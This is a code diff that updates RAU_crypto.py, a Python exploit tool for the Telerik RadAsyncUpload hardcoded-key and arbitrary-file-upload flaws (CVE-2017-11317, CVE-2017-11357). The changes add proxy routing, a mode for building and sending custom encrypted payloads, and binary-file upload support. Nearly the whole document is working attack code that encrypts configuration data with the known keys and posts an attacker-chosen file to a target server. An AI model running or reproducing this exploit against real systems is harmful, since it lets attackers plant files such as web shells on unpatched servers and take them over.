@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# Author: Paul Taylor / Foregenix Ltd
+# Author: Paul Taylor / @bao7uo
 # https://github.com/bao7uo/RAU_crypto/blob/master/RAU_crypto.py
 
 # RAU crypto - Exploiting CVE-2017-11317, CVE-2017-11357
@@ -9,7 +9,7 @@
 # RadAsyncUpload hardcoded keys / insecure direct object reference
 # Arbitrary file upload
 
-# Telerik fixed in June 2017 by removing default keys in
+# Telerik mitigated in June 2017 by removing default keys in
 # versions R2 2017 SP1 (2017.2.621) and providing the ability to disable the
 # RadAsyncUpload feature in R2 2017 SP2 (2017.2.711)
 
@@ -24,6 +24,7 @@ import base64
 import json
 import re
 import requests
+import os
 from Crypto.Cipher import AES
 from Crypto.Hash import HMAC
 from Crypto.Hash import SHA256
@@ -82,7 +83,18 @@ class RAUCipher:
         return string + hmac if isHmacVersion else string
 
 
-def rauPostData_prep(quiet, TempTargetFolder, Version):
+def getProxy(proxy):
+    return { 'http' : proxy, 'https' : proxy }
+
+
+def rauPostData_enc(partA, partB):
+    data = "-----------------------------62616f37756f2e\r\n"
+    data += "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
+    data += "\r\n"
+    data += RAUCipher.encrypt(partA) + "&" + RAUCipher.encrypt(partB) + "\r\n"
+    return  data
+
+def rauPostData_prep(TempTargetFolder, Version):
     TargetFolder = RAUCipher.addHmac(
                                 "jgas0meSrU/uP/TPzrhDTw==",
                                 Version
@@ -92,26 +104,21 @@ def rauPostData_prep(quiet, TempTargetFolder, Version):
                                 Version
                                 )
 
-    rauJSONplaintext = \
+    partA = \
         '{"TargetFolder":"' + TargetFolder + '","TempTargetFolder":"' + \
         TempTargetFolder + \
         '","MaxFileSize":0,"TimeToLive":{"Ticks":1440000000000,"Days":0,"Hours":40,"Minutes":0,"Seconds":0,"Milliseconds":0,"TotalDays":1.6666666666666666,"TotalHours":40,"TotalMinutes":2400,"TotalSeconds":144000,"TotalMilliseconds":144000000},"UseApplicationPoolImpersonation":false}'
-    if not quiet:
-        print("JSON: " + rauJSONplaintext + "\n")
-    rauPostData = RAUCipher.encrypt(rauJSONplaintext) + "&"
-    rauVersionplaintext = \
+
+    partB = \
         "Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=" + \
-        Version + \
-        ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
-    if not quiet:
-        print("Version: " + rauVersionplaintext + "\n")
-    rauPostData += RAUCipher.encrypt(rauVersionplaintext)
-    return rauPostData
+        Version + ", Culture=neutral, PublicKeyToken=121fae78165ba3d4"
+    
+    return rauPostData_enc(partA, partB)
 
 
-def getVersion(url):
+def getVersion(url, proxy = False):
     sys.stderr.write("Contacting server... ")
-    response = requests.get(url, verify=False)
+    response = requests.get(url, verify=False, proxies = getProxy(proxy))
     html = response.text
     sys.stderr.write("done\n")
     match = re.search(
@@ -128,65 +135,59 @@ def getVersion(url):
 
 
 def payload(TempTargetFolder, Version, payload_filename):
-    sys.stderr.write("file: " + payload_filename + "\n")
-    sys.stderr.write("version: " + Version + "\n")
-    sys.stderr.write("destination " + TempTargetFolder + "\n")
+    sys.stderr.write("Local file path: " + payload_filename + "\n")
+    payload_filebasename = os.path.basename(payload_filename)
+    sys.stderr.write("Destination file name: " + payload_filebasename + "\n")
+    sys.stderr.write("Destination path: " + TempTargetFolder + "\n")
+    sys.stderr.write("Version: " + Version + "\n")
     sys.stderr.write("Preparing payload... \n")
-    payload_file = open(payload_filename, "r")
+    payload_file = open(payload_filename, "rb")
     payload_file_data = payload_file.read()
     payload_file.close()
-    quiet = True
 
-    data = "-----------------------------68821516528156\r\n"
-    data += "Content-Disposition: form-data; name=\"rauPostData\"\r\n"
-    data += "\r\n"
-    data += rauPostData_prep(quiet, TempTargetFolder, Version) + "\r\n"
-    data += "-----------------------------68821516528156\r\n"
+    data = rauPostData_prep(TempTargetFolder, Version)
+    data += "-----------------------------62616f37756f2e\r\n"
     data += "Content-Disposition: form-data; name=\"file\"; filename=\"blob\"\r\n"
     data += "Content-Type: application/octet-stream\r\n"
     data += "\r\n"
-    data += payload_file_data
-    data += "-----------------------------68821516528156\r\n"
+    data += payload_file_data.decode('raw_unicode_escape') + "\r\n"
+    data += "-----------------------------62616f37756f2e\r\n"
     data += "Content-Disposition: form-data; name=\"fileName\"\r\n"
     data += "\r\n"
     data += "RAU_crypto.bypass\r\n"
-    data += "-----------------------------68821516528156\r\n"
+    data += "-----------------------------62616f37756f2e\r\n"
     data += "Content-Disposition: form-data; name=\"contentType\"\r\n"
     data += "\r\n"
     data += "text/html\r\n"
-    data += "-----------------------------68821516528156\r\n"
+    data += "-----------------------------62616f37756f2e\r\n"
     data += "Content-Disposition: form-data; name=\"lastModifiedDate\"\r\n"
     data += "\r\n"
-    data += "2017-06-28T09:11:28.586Z\r\n"
-    data += "-----------------------------68821516528156\r\n"
+    data += "2019-01-02T03:04:05.067Z\r\n"
+    data += "-----------------------------62616f37756f2e\r\n"
     data += "Content-Disposition: form-data; name=\"metadata\"\r\n"
     data += "\r\n"
     data += "{\"TotalChunks\":1,\"ChunkIndex\":0,\"TotalFileSize\":1,\"UploadID\":\"" + \
-            payload_filename + "\"}\r\n"
-    data += "-----------------------------68821516528156--\r\n"
+            payload_filebasename + "\"}\r\n"
+    data += "-----------------------------62616f37756f2e--\r\n"
     data += "\r\n"
     sys.stderr.write("Payload prep done\n")
     return data
 
 
-def upload(TempTargetFolder, Version, payload_filename, url):
-    sys.stderr.write("Preparing to upload to " + url + "\n")
+def upload(data, url, proxy = False):
+    sys.stderr.write("Preparing to send request to " + url + "\n")
     session = requests.Session()
     request = requests.Request(
                         'POST',
                         url,
-                        data=payload(
-                                TempTargetFolder,
-                                Version,
-                                payload_filename
-                                )
+                        data=data
                         )
     request = request.prepare()
     request.headers["Content-Type"] = \
         "multipart/form-data; " +\
-        "boundary=---------------------------68821516528156"
-    response = session.send(request, verify=False)
-    sys.stderr.write("Upload done\n")
+        "boundary=---------------------------62616f37756f2e"
+    response = session.send(request, verify=False, proxies = getProxy(proxy))
+    sys.stderr.write("Request done\n")
     return response.text
 
 
@@ -222,29 +223,45 @@ def mode_encrypt():
 
 def mode_Encrypt_rauPostData():
     # encrypt rauPostData based on TempTargetFolder and Version
-    quiet = False
     TempTargetFolder = sys.argv[2]
     Version = sys.argv[3]
     print(
         "rauPostData: " +
-        rauPostData_prep(quiet, TempTargetFolder, Version) +
+        rauPostData_prep(TempTargetFolder, Version) +
         "\n"
     )
 
 
-def mode_encrypt_rauPostData_Quiet():
-    # as per -E but just output encrypted rauPostData,
-    # not the prepared JSON and version
-    quiet = True
-    TempTargetFolder = sys.argv[2]
-    Version = sys.argv[3]
-    print(rauPostData_prep(quiet, TempTargetFolder, Version))
+def custom_payload(partA, partB):
+    return  rauPostData_enc(partA, partB) \
+    + "-----------------------------62616f37756f2e\r\n" \
+    + "Content-Disposition: filename=\"bao7uo\"\r\n" \
+    + "\r\n" \
+    + "-----------------------------62616f37756f2e--\r\n"
 
 
-def mode_version():
+def mode_encrypt_custom_Payload():
+    print(
+        "Custom Payload: \n\n" + custom_payload(sys.argv[2], sys.argv[3])
+    )
+
+
+def mode_send_custom_Payload(proxy = False):
+    print(upload(custom_payload(sys.argv[2], sys.argv[3]), sys.argv[4], proxy))    
+
+
+def mode_send_custom_Payload_proxy(): 
+    mode_send_custom_Payload(sys.argv[5])
+
+
+def mode_version_proxy():
+    mode_version(sys.argv[3])
+
+
+def mode_version(proxy = False):
     # extract Telerik web ui version details from url
     url = sys.argv[2]
-    print(getVersion(url))
+    print(getVersion(url, proxy))
 
 
 def mode_payload():
@@ -252,37 +269,47 @@ def mode_payload():
     TempTargetFolder = sys.argv[2]
     Version = sys.argv[3]
     payload_filename = sys.argv[4]
-    print("Content-Type: multipart/form-data; boundary=---------------------------68821516528156")
+    print("Content-Type: multipart/form-data; boundary=---------------------------62616f37756f2e")
     print(payload(TempTargetFolder, Version, payload_filename))
 
 
-def mode_Post():
+def mode_Post_Proxy():
+    mode_Post(sys.argv[6])
+
+
+def mode_Post(proxy = False):
     # generate and upload a payload based on
     # TempTargetFolder, Version, payload file and url
     TempTargetFolder = sys.argv[2]
     Version = sys.argv[3]
     payload_filename = sys.argv[4]
     url = sys.argv[5]
-    print(upload(TempTargetFolder, Version, payload_filename, url))
+
+    print(upload(payload(TempTargetFolder, Version, payload_filename), url, proxy))
 
 
 def mode_help():
     print(
         "Usage:\n" +
         "\n" +
-        "Decrypt a plaintext:      -d ciphertext\n" +
-        "Decrypt rauPostData:      -D rauPostData\n" +
-        "Encrypt a plaintext:      -e plaintext\n" +
-        "Gen rauPostData:          -E TempTargetFolder Version\n" +
-        "Gen rauPostData (quiet):  -Q TempTargetFolder Version\n" +
-        "Version in HTTP response: -v url\n" +
-        "Generate a POST payload:  -p TempTargetFolder Version c:\\\\folder\\\\filename\n" +
-        "Upload a payload:         -P TempTargetFolder Version c:\\\\folder\\\\filename url\n\n"
+        "Decrypt a ciphertext:               -d ciphertext\n" +
+        "Decrypt rauPostData:                -D rauPostData\n" +
+        "Encrypt a plaintext:                -e plaintext\n\n" +
+
+        "Generate file upload rauPostData:   -E c:\\\\destination\\\\folder Version\n" +
+        "Generate all file upload POST data: -p c:\\\\destination\\\\folder Version ../local/filename\n" +
+        "Upload file:                        -P c:\\\\destination\\\\folder Version c:\\\\local\\\\filename url [proxy]\n\n" +
+
+        "Generate custom payload POST data : -c partA partB\n" +
+        "Send custom payload:                -c partA partB url [proxy]\n\n" +
+
+        "Version in HTTP response:           -v url [proxy]\n\n" +
+
         "Example URL:               http://target/Telerik.Web.UI.WebResource.axd?type=rau"
     )
 
 
-sys.stderr.write("\nRAU_crypto by Paul Taylor / Foregenix Ltd.\n")
+sys.stderr.write("\nRAU_crypto by Paul Taylor / @bao7uo \n")
 sys.stderr.write(
         "CVE-2017-11317 - " +
         "Telerik RadAsyncUpload hardcoded keys / arbitrary file upload\n\n"
@@ -298,13 +325,21 @@ elif sys.argv[1] == "-e" and len(sys.argv) == 3:
     mode_encrypt()
 elif sys.argv[1] == "-E" and len(sys.argv) == 4:
     mode_Encrypt_rauPostData()
-elif sys.argv[1] == "-Q" and len(sys.argv) == 4:
-    mode_encrypt_rauPostData_Quiet()
+elif sys.argv[1] == "-c" and len(sys.argv) == 4:
+    mode_encrypt_custom_Payload()
+elif sys.argv[1] == "-C" and len(sys.argv) == 5:
+    mode_send_custom_Payload()
+elif sys.argv[1] == "-C" and len(sys.argv) == 6:
+    mode_send_custom_Payload_proxy()   
 elif sys.argv[1] == "-v" and len(sys.argv) == 3:
     mode_version()
+elif sys.argv[1] == "-v" and len(sys.argv) == 4:
+    mode_version_proxy()
 elif sys.argv[1] == "-p" and len(sys.argv) == 5:
     mode_payload()
 elif sys.argv[1] == "-P" and len(sys.argv) == 6:
     mode_Post()
+elif sys.argv[1] == "-P" and len(sys.argv) == 7:
+    mode_Post_Proxy()
 else:
     mode_help()
